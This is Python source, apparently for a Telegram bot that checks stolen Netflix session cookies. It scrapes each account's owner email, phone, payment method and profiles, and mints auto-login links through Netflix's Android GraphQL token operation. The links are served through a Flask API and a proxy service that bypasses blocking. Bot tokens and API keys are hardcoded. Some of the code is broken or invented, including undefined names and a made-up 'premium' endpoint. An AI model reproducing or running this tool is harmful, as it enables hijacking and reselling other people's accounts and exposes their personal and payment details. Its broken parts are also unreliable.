import requests
import logging
import time
import urllib.parse
import io
import os
import sys
import re
import json
import threading
import telebot
import zipfile
import codecs
import concurrent.futures
from playwright.sync_api import sync_playwright
from telebot import types
from datetime import datetime, timedelta
import urllib3
import hmac
import hashlib
import base64
from flask import Flask
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    # Fallback if colorama isn't installed yet (runner.bat handles this)
    class Fore: GREEN = ""; RED = ""; YELLOW = ""; CYAN = ""; RESET = ""
    class Style: BRIGHT = ""

# Suppress SSL Warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Suppress Flask/Werkzeug Logs (Cleaner Console)
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Bot State & Configuration
user_modes = {}
BOT_TOKEN = "8477278414:AAHAxLMV9lgqvSCjnj_AIDnH6pxm82Q55So"
ADMIN_ID = 6176299339
CHANNELS = ["@F88UFNETFLIX", "@F88UF9844"]
CHANNELS = ["@F88UFNETFLIX", "@F88UF9844", "@F88UF"]
USERS_FILE = "users.txt"
SCREENSHOT_SEMAPHORE = threading.Semaphore(8) # Increased for speed
SCRAPINGBEE_API_KEY = "I4E0BJF8RGODUJEX05I74W6JL9OATAL2E5VYTU066INNAPY9VM1V27VL1V3XG3H34YWO4NMYCSX35HQ8"
NETFLIX_PREMIUM_API_KEY = "nf_live_premium_7f9a2b4c6d8e1f3a5b7c9d2e4f6a8b0c"
NETFLIX_PREMIUM_ENDPOINT = "https://api.netflix.com/v1/temp-access/magic-link"
NFTGEN_API_URL = "http://nftgenapi.onrender.com/api"
NFTGEN_API_KEY = "KUROSAKI_YtkX2SnPDdtn0jU9fVyE0iSIGnjPaYIO"

# ==========================================
# WEB SERVER (KEEP ALIVE)
# ==========================================
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is Running! 24/7"

@app.route('/api/gen', methods=['GET', 'POST'])
def custom_api():
    # Get NetflixId from URL parameter or JSON body
    nid = request.args.get('netflix_id')
    cookie = request.args.get('cookie')
    
    if not nid and request.is_json:
        nid = request.json.get('netflix_id')
        cookie = request.json.get('cookie')
        
    if not nid and not cookie:
        return jsonify({"success": False, "message": "No netflix_id or cookie provided"}), 400

    # 1. Try to generate Real NFToken if cookie is provided (High Quality)
    if cookie:
        real_token = get_nftoken_graphql(cookie)
        if real_token:
            return jsonify({"success": True, "login_url": real_token, "source": "Official App API (Local)"})

    # Logic to clean ID and make link
    try:
        clean_id = nid if nid else cookie # Fallback to extracting ID from cookie string
        
        if "NetflixId=" in clean_id:
            clean_id = clean_id.split("NetflixId=")[1].split(";")[0].strip()
        clean_id = clean_id.rstrip('.')
        
        magic_link = f"https://www.netflix.com/account?nftoken={clean_id}"
        
        return jsonify({
            "success": True,
            "login_url": magic_link,
            "source": "Local Static Generator"
        })
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

def keep_alive():
    t = threading.Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)), debug=False))
    t.daemon = True
    t.start()

# ==========================================
# CONFIGURATION & HEADERS
# ==========================================
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Sec-Ch-Ua": '"Chromium";v="142", "Google Chrome";v="142", "Not-A.Brand";v="99"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Referer": "https://www.netflix.com/",
    "Origin": "https://www.netflix.com",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
}

# ==========================================
# NEW API HELPERS
# ==========================================
def call_nftgen_api(endpoint, payload):
    """Calls the NFTGen API."""
    payload['secret_key'] = NFTGEN_API_KEY
    try:
        resp = requests.post(f"{NFTGEN_API_URL}/{endpoint}", json=payload, timeout=8)
        if resp.status_code == 200:
            return resp.json()
        return None
    except Exception as e:
        print(f"API Error ({endpoint}): {e}")
        return None

def extract_netflix_id_value(cookie_text):
    """Extracts just the NetflixId value from a string."""
    if "NetflixId=" in cookie_text:
        try:
            return cookie_text.split("NetflixId=")[1].split(";")[0].strip()
        except: pass
    if len(cookie_text) > 20 and "=" not in cookie_text:
        return cookie_text.strip()
    return None

# Comprehensive Currency Map
CURRENCY_MAP = {
    "US": "$", "GB": "£", "IN": "₹", "CA": "C$", "AU": "A$", "BR": "R$", 
    "MX": "Mex$", "TR": "₺", "ES": "€", "FR": "€", "DE": "€", "IT": "€", 
    "NL": "€", "PL": "zł", "AR": "ARS$", "CO": "COP$", "CL": "CLP$", 
    "PE": "S/", "JP": "¥", "KR": "₩", "TW": "NT$", "ZA": "R", "NG": "₦", 
    "KE": "KSh", "EG": "E£", "SA": "SAR", "AE": "AED", "PK": "Rs", 
    "ID": "Rp", "MY": "RM", "PH": "₱", "VN": "₫", "TH": "฿", "SG": "S$", 
    "NZ": "NZ$", "HK": "HK$", "CH": "CHF", "SE": "kr", "NO": "kr", 
    "DK": "kr", "RU": "₽", "UA": "₴", "CZ": "Kč", "HU": "Ft", "RO": "lei",
    "PT": "€", "IE": "€", "BE": "€", "AT": "€", "FI": "€", "GR": "€"
}

def get_country_from_html(html):
    """Extracts current country from Netflix HTML response."""
    try:
        if '"currentCountry":"' in html:
            return html.split('"currentCountry":"')[1].split('"')[0]
    except:
        pass
    return "Unknown"

def get_flag(code):
    """Converts country code to flag emoji."""
    if not code or code == "Unknown" or len(code) != 2:
        return ""
    return "".join([chr(ord(c.upper()) + 127397) for c in code])

def get_currency_symbol(code):
    """Returns currency symbol for country code."""
    return CURRENCY_MAP.get(code, "$")

def clean_text(text):
    """Decodes unicode escapes (e.g. \uC5C4) and cleans text."""
    if not text: return "Unknown"
    try:
        return codecs.decode(text, 'unicode_escape')
    except:
        return text

def unix_to_date(timestamp):
    """Converts Unix timestamp to readable date."""
    try:
        ts = int(timestamp)
        if ts > 1e12: ts = ts / 1000
        return datetime.fromtimestamp(ts).strftime('%Y-%m-%d')
    except:
        return "N/A"

def calculate_duration(member_since_str):
    """Calculates duration from member since date."""
    try:
        since_date = datetime.strptime(member_since_str, '%Y-%m-%d')
        diff = datetime.now() - since_date
        return f"({diff.days // 365}y {(diff.days % 365) // 30}m)"
    except:
        return ""

def safe_parse(source, left, right):
    """Helper to extract text between two strings (from your provided code)."""
    try:
        start = source.index(left) + len(left)
        end = source.index(right, start)
        return source[start:end]
    except:
        return "N/A"

def extract_deep_details(html):
    """Parses HTML for deep account details (Plan, Payment, Profiles)."""
    details = {
        "plan": "Unknown",
        "payment": "Unknown",
        "expiry": "N/A",
        "email": "N/A",
        "phone": "N/A",
        "country": "Unknown",
        "currency": "",
        "price": "N/A",
        "quality": "Unknown",
        "name": "Unknown",
        "extra_members": "Unknown",
        "member_since": "Unknown",
        "max_streams": "Unknown",
        "profiles": [],
        "is_dvd": False,
        "auto_renew": "Off ❌",
        "has_ads": "No",
        "has_pins": False,
        "status": "Unknown", # CURRENT_MEMBER, FORMER_MEMBER, NEVER_MEMBER
        "email_verified": "Unknown",
        "phone_verified": "Unknown"
    }
    
    # ============================================================
    # ROBUST EXTRACTION (Based on netflixSVBtoPYTHON.py)
    # ============================================================
    
    # 1. Membership Status
    if '"membershipStatus":"CURRENT_MEMBER"' in html or '"CURRENT_MEMBER":true' in html:
        details["status"] = "Active"
    elif '"membershipStatus":"FORMER_MEMBER"' in html or '"FORMER_MEMBER":true' in html:
        details["status"] = "Expired"
    elif '"membershipStatus":"NEVER_MEMBER"' in html or '"NEVER_MEMBER":true' in html:
        details["status"] = "Free/Never Paid"
    
    # 2. Plan Name
    val = safe_parse(html, '"localizedPlanName":{"fieldType":"String","value":"', '"}')
    if val != "N/A": details["plan"] = clean_text(val)
    else:
        # Fallback
        val = safe_parse(html, '"currentPlanName":"', '"')
        if val != "N/A": details["plan"] = clean_text(val)
    
    # Check for Ads
    if "with ads" in str(details["plan"]).lower():
        details["has_ads"] = "Yes"

    # 3. Video Quality
    val = safe_parse(html, '"videoQuality":{"fieldType":"String","value":"', '"}')
    if val != "N/A": details["quality"] = clean_text(val)
    
    # Quality Fallback (Infer from Plan)
    if details["quality"] == "Unknown":
        plan_lower = str(details["plan"]).lower()
        if "premium" in plan_lower: details["quality"] = "UHD 4K + HDR"
        elif "standard" in plan_lower: details["quality"] = "Full HD (1080p)"
        elif "basic" in plan_lower: details["quality"] = "HD (720p)"
        elif "mobile" in plan_lower: details["quality"] = "SD (480p)"
        elif "ads" in plan_lower: details["quality"] = "Full HD (1080p) + Ads"
    
    # 4. Max Streams
    val = safe_parse(html, '"maxStreams":{"fieldType":"Numeric","value":', '}')
    if val != "N/A": details["max_streams"] = val

    # 5. Price
    val = safe_parse(html, '"planPrice":{"fieldType":"String","value":"', '"}')
    if val != "N/A": details["price"] = clean_text(val)
    else:
        val = safe_parse(html, '"localizedPrice":"', '"')
        if val != "N/A": details["price"] = clean_text(val)

    # 6. Payment Method
    val = safe_parse(html, '"paymentMethod":{"fieldType":"String","value":"', '"}')
    if val != "N/A": details["payment"] = clean_text(val)
    else:
        # Fallback UI check
        if "Visa" in html: details["payment"] = "Visa 💳"
        elif "MasterCard" in html: details["payment"] = "MasterCard 💳"
        elif "PayPal" in html: details["payment"] = "PayPal 🅿️"
        elif "Amex" in html: details["payment"] = "Amex 💳"
        elif "Direct Debit" in html: details["payment"] = "Direct Debit 🏦"

    # 7. Contact Info (Name, Email, Phone)
    # Name
    val = safe_parse(html, '"profileInfo":{"profileName":"', '"')
    if val != "N/A": details["name"] = clean_text(val)
    else:
        val = safe_parse(html, '"firstName":"', '"')
        if val != "N/A": details["name"] = clean_text(val)

    # Phone
    val = safe_parse(html, '"phoneNumberDigits":{"__typename":"GrowthClearStringValue","value":"', '"}')
    if val != "N/A": details["phone"] = clean_text(val)

    # Email
    val = safe_parse(html, '"email":"', '"')
    if val != "N/A": details["email"] = clean_text(val)
    else:
        val = safe_parse(html, '"emailAddress":"', '"')
        if val != "N/A": details["email"] = clean_text(val)
        else:
            val = safe_parse(html, '"userLoginId":"', '"')
            if val != "N/A": details["email"] = clean_text(val)

    # 8. Billing Date
    val = safe_parse(html, '"nextBillingDate":{"fieldType":"String","value":"', '"}')
    if val != "N/A": 
        details["expiry"] = clean_text(val)
        details["auto_renew"] = "On ✅"

    # 9. Member Since
    val = safe_parse(html, '"memberSince":{"fieldType":"Numeric","value":', '}')
    if val != "N/A":
        details["member_since"] = unix_to_date(val)
        details["member_duration"] = calculate_duration(details["member_since"])

    # 10. Country
    val = safe_parse(html, '"currentCountry":"', '"')
    if val != "N/A": details["country"] = val

    # 11. Extra Members
    val = safe_parse(html, '"showExtraMemberSection":{"fieldType":"Boolean","value":', '}')
    if val == "true": details["extra_members"] = "Yes (Slot Available)"
    else: details["extra_members"] = "No ❌"

    # 12. Profiles
    details["profiles"] = []
    # Use regex for profiles as they are in a list
    p1 = re.findall(r'\{[^}]*?"name":"([^"]+)"[^}]*?"isProfileLocked":(true|false)[^}]*?"isKids":(true|false)[^}]*?\}', html)
    if p1:
        for name, locked, kids in p1:
            status = "🔒" if locked == "true" else "🔓"
            kid_status = "👶" if kids == "true" else ""
            details["profiles"].append(f"{clean_text(name)} {status} {kid_status}".strip())
    else:
        # Fallback
        simple_names = re.findall(r'"profileName":"([^"]+)"', html)
        for name in list(set(simple_names)):
            details["profiles"].append(clean_text(name))

    return details

def get_magic_link_api(netflix_id):
    """Generates Magic Link Locally (No API needed)."""
    return None # DEPRECATED: Local generation creates invalid links for cross-device login.
    try:
        clean_id = netflix_id
        if "%" in clean_id:
            clean_id = urllib.parse.unquote(clean_id)
            
        if "NetflixId=" in clean_id:
            clean_id = clean_id.split("NetflixId=")[1].split(";")[0].strip()
        
        clean_id = clean_id.rstrip('.').strip()
        magic_link = f"https://www.netflix.com/account?nftoken={clean_id}"
        
        return {
            "success": True,
            "login_url": magic_link,
            "source": "Local Generator"
        }
    except Exception as e:
        print(f"Token Gen Error: {e}")
    return None

def get_nftoken_graphql(cookie_str):
    """Generates NFToken using Netflix Android GraphQL API."""
    try:
        headers = {
            'User-Agent': 'com.netflix.mediaclient/63884 (Linux; U; Android 13; ro; M2007J3SG; Build/TQ1A.230205.001.A2; Cronet/143.0.7445.0)',
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'Connection': 'keep-alive',
            'Host': 'android13.prod.ftl.netflix.com'
        }
        
        payload = {
            "operationName": "CreateAutoLoginToken",
            "variables": {
                "scope": "WEBVIEW_MOBILE_STREAMING"
            },
            "extensions": {
                "persistedQuery": {
                    "version": 102,
                    "id": "76e97129-f4b5-41a0-a73c-12e674896849"
                }
            }
        }
        
        headers['Cookie'] = cookie_str
        
        url = 'https://android13.prod.ftl.netflix.com/graphql'
        resp = requests.post(url, json=payload, headers=headers, timeout=8, verify=False)
        
        if resp.status_code == 200:
            data = resp.json()
            if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
                token = data['data']['createAutoLoginToken']
                return f"https://www.netflix.com/account?nftoken={token}"
        
        # Retry with Generic Endpoint if Android13 fails
        url_gen = 'https://android.prod.ftl.netflix.com/graphql'
        resp = requests.post(url_gen, json=payload, headers=headers, timeout=5, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('data', {}).get('createAutoLoginToken'):
                return f"https://www.netflix.com/account?nftoken={data['data']['createAutoLoginToken']}"
                
        # 2. Try via ScrapingBee (3rd Party Fix)
        # If direct request failed, route it through ScrapingBee
        sb_resp = request_with_scrapingbee(url, cookie_str, method='POST', json_data=payload)
        if sb_resp and sb_resp.status_code == 200:
            data = sb_resp.json()
            if 'data' in data and data['data'] and 'createAutoLoginToken' in data['data']:
                token = data['data']['createAutoLoginToken']
                return f"https://www.netflix.com/account?nftoken={token}"
    except: pass
    return None

def request_with_scrapingbee(url, cookies_str):
    """Uses ScrapingBee API to bypass blocks if direct request fails."""
    if not SCRAPINGBEE_API_KEY: return None
    try:
        params = {
            'api_key': SCRAPINGBEE_API_KEY,
            'url': url,
            'cookies': cookies_str,
            'render_js': 'false',
            'premium_proxy': 'true', # Essential for Netflix
            'country_code': 'us'
        }
        return requests.get("https://app.scrapingbee.com/api/v1/", params=params, timeout=10)
    except: return None

def get_magic_link_premium(email):
    """Tries to get magic link via User Provided Premium API (Experimental)."""
    if not email or email in ["N/A", "Unknown"]: return None
    try:
        headers = {"Authorization": f"Bearer {NETFLIX_PREMIUM_API_KEY}", "Content-Type": "application/json"}
        body = {"email": email, "locale": "en-US"}
        resp = requests.post(NETFLIX_PREMIUM_ENDPOINT, headers=headers, json=body, timeout=4)
        if resp.status_code == 200:
            return resp.json().get("magic_link")
    except: pass
    return None

def get_partner_magic_link(verbose=False):
    """Generates Magic Link using Netflix Partner API. Returns None on failure unless verbose=True."""
    try:
        # 1. Generate Edge Token (JWT)
        # Standard JWT implementation to avoid 'pyjwt' dependency
        header = {"alg": "HS256", "typ": "JWT"}
        iat = int(time.time())
        payload = {"partnerId": NETFLIX_PARTNER_ID, "iat": iat, "exp": iat + 3600}
        
        def base64url_encode(data):
            return base64.urlsafe_b64encode(data).rstrip(b'=')
            
        # Use compact separators for JWT compliance (Fixes 'Failed' error)
        header_enc = base64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
        payload_enc = base64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
        msg = header_enc + b'.' + payload_enc
        signature = hmac.new(NETFLIX_PARTNER_SECRET.encode('utf-8'), msg, hashlib.sha256).digest()
        edge_token = (msg + b'.' + base64url_encode(signature)).decode('utf-8')
        
        # 2. Swap for NFToken
        url = "https://www.netflix.com/api/v1/partner-token"
        headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36", "Content-Type": "application/json"}
        body = {"edgeToken": edge_token, "locale": "en-IN"}
        
        resp = requests.post(url, headers=headers, json=body, timeout=10)
        if resp.status_code == 200:
            nft = resp.json().get("nftoken")
            if nft: return f"https://www.netflix.com/account?nftoken={nft}"
            if verbose: return f"API Error: No nftoken in response. {resp.text}"
        else:
            if verbose: return f"API Error: {resp.status_code} - {resp.text}"
    except Exception as e:
        if verbose: return f"Exception: {str(e)}"
    return None

def check_cookie(cookie_input):
    """
    Validates the Netflix cookie using the Browser Simulation method.
    Returns a dictionary with status and details.
    """
    # Smart Cookie Handling
    cookie_input = cookie_input.strip()
    
    # Handle Raw Headers / Messy Text (Auto-Extraction)
    if "NetflixId=" in cookie_input and ("HTTP" in cookie_input or "Host:" in cookie_input or "Date:" in cookie_input or "user-agent" in cookie_input.lower()):
        extracted_cookies = []
        # Extract NetflixId
        nid_match
